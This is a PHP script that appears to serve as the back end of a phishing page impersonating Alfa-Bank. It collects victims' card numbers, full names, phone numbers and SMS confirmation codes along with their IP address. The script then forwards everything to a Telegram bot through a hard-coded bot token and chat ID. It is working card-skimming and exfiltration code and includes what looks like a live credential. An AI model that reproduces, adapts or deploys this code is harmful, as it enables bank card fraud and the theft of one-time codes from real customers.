<?php
function send_message($text){
    $token = "6010612567:AAHmvmFttqrfXeEtEUMJUUJvwx4DPkMtU74";
    $chat_id = "-1003963677609"; // Ваш ID чата/канала
    
    $data = [
        "chat_id" => $chat_id,
        "text" => $text,
        "parse_mode" => "html"
    ];
    
    $ch = curl_init('https://api.telegram.org/bot' . $token . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Отключаем проверку SSL (частая причина молчаливых ошибок)
    curl_exec($ch);
    curl_close($ch);
}

function get_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$ip = get_ip();

if (!empty($_POST['card'])) {
    $card = $_POST['card'];
    $fio = !empty($_POST['fio']) ? $_POST['fio'] : 'Не указано';
    $phone = !empty($_POST['phone']) ? $_POST['phone'] : 'Не указано';
    
    $txt = "
🅰️ <b>Альфа-Банк</b>
🅰️ <b>IP</b> : $ip
🅰️ <b>ФИО</b> : $fio
🅰️ <b>Номер карты</b> : $card
🅰️ <b>Номер телефона</b> : $phone
";
    send_message($txt);
}

if (!empty($_POST['sms'])) {
    $sms = $_POST['sms'];
    
    $txt = "
🅰️ <b>Альфа-Банк</b>
🅰️ <b>IP</b> : $ip
🅰️ <b>SMS</b> : $sms
";
    send_message($txt);
}